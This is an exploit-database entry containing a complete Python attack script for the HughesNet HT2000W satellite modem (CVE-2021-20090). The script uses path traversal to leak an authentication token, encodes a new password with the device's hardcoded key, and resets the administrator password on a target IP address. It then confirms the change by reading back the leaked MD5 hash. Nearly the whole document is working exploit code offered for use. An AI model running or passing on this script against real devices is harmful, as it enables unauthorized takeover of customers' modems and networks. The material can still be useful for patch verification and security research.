@@ -1,0 +1,103 @@
+id: 39731
+date: 08/27/2024
+title: HughesNet HT2000W Satellite Modem - Password Reset Exploit
+author: Simon Greenblatt
+cves: CVE-2021-20090
+
+# Exploit Title: HughesNet HT2000W Satellite Modem (Arcadyan httpd 1.0) - Password Reset
+# Exploit Author: Simon Greenblatt <simongreenblatt[at]protonmail.com>
+# Vendor: HughesNet
+# Version: Arcadyan httpd 1.0
+# Tested on: Linux
+# CVE: CVE-2021-20090
+
+import sys
+import requests
+import re
+import base64
+import hashlib
+import urllib
+
+red = "\033[0;41m"
+green = "\033[1;34;42m"
+reset = "\033[0m"
+
+def print_banner():
+    print(green + '''
+    _____________   _______________         _______________   ________  ____          _______________  _______  _______________    
+    \_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \/_   |         \_____  \   _  \ \   _  \/   __   \   _  \   
+    /    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/ |   |  ______  /  ____/  /_\  \/  /_\  \____    /  /_\  \  
+    \     \____\     /   |        \ /_____/ /       \  \_/   \/       \ |   | /_____/ /       \  \_/   \  \_/   \ /    /\  \_/   \ 
+     \______  / \___/   /_______  /         \_______ \_____  /\_______ \|___|         \_______ \_____  /\_____  //____/  \_____  / 
+            \/                  \/                  \/     \/         \/                      \/     \/       \/               \/  \n''' + reset)
+    print("                           Administrator password reset for HughesNet HT2000W Satellite Modem")
+    print('''
+    Usage: python3 hughes_ht2000w_pass_reset.py <password> <ip_address>
+    <password>:   The new administrator password
+    <ip_address>: The IP address of the web portal. If none is provided, the script will default to 192.168.42.1\n
+    This script takes advantage of CVE-2021-20090, a path traversal vulnerability in the HTTP daemon of the HT2000W modem to reset
+    the administrator password of the configuration portal. It also takes advantage of other vulnerabilities in the device such as
+    improper use of httokens for authentication and the portal allowing the MD5 hash of the password to be leaked.''')
+    return None
+
+def get_httoken(ip_address):
+    # Make a GET request to system_p.htm using path traversal
+    r = requests.get(f'http://{ip_address}/images/..%2fsystem_p.htm')
+    if r.status_code != 200:
+        print(red + f"(-) Failure: Could not request system_p.htm" + reset)
+        exit()
+    # Extract the httoken hidden in the DOM and convert it from Base64
+    return base64.b64decode(re.search(r'AAAIBRAA7(.*?)"', r.text).group(1)).decode('ascii')
+
+def encode_pass(password):
+    # Vigenere Cipher
+    key = "wg7005d"
+    enc_pass = ""
+    idx = 0
+    for c in password:
+        enc_pass += str(ord(c) + ord(key[idx])) + "+"
+        idx = (idx + 1) % len(key)
+    return enc_pass
+
+def change_pass(ip_address, httoken, enc_pass):
+    # Create a POST request with the httoken and the encoded password
+    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': f'http://{ip_address}/system_p.htm'}
+    payload = {'action': 'ui_system_p', 'httoken': httoken, 'submit_button': 'system_p.htm', 'ARC_SYS_Password': enc_pass}
+    payload = urllib.parse.urlencode(payload, safe=':+')
+    try:
+        r = requests.post(f'http://{ip_address}/images/..%2fapply_abstract.cgi', data = payload, headers = headers)
+    except:
+        pass
+    return None
+
+def verify_pass(ip_address, new_pass):
+    # Make a GET request to cgi_sys_p.js to verify password
+    httoken = get_httoken(ip_address)
+    headers = {'Referer': f'http://{ip_address}/system_p.htm'}
+    r = requests.get(f'http://{ip_address}/images/..%2fcgi/cgi_sys_p.js?_tn={httoken}', headers = headers)
+    if r.text.split('"')[5] != hashlib.md5(bytes(new_pass, 'ascii')).hexdigest():
+        print(red + "(-) Failure: Could not verify the hash of the password" + reset)
+        exit()
+
+def main():
+    if not (len(sys.argv) == 2 or len(sys.argv) == 3):
+        print_banner()
+        return
+    new_pass = sys.argv[1]
+    ip_address = "192.168.42.1"
+    if sys.argv == 3:
+        ip_address = sys.argv[2]
+    httoken = get_httoken(ip_address)
+    print(f"[+] Obtained httoken: {httoken}")
+    enc_pass = encode_pass(new_pass)
+    change_pass(ip_address, httoken, enc_pass)
+    print(f"[+] Password reset to: {new_pass}")
+    verify_pass(ip_address, new_pass)
+    print("[+] Verified password hash: " + hashlib.md5(bytes(new_pass, 'ascii')).hexdigest())
+    print("[+] Password successfully changed!")
+    return
+
+if __name__ == '__main__':
+    main()
+
+#  0day.today [2024-08-28]  #
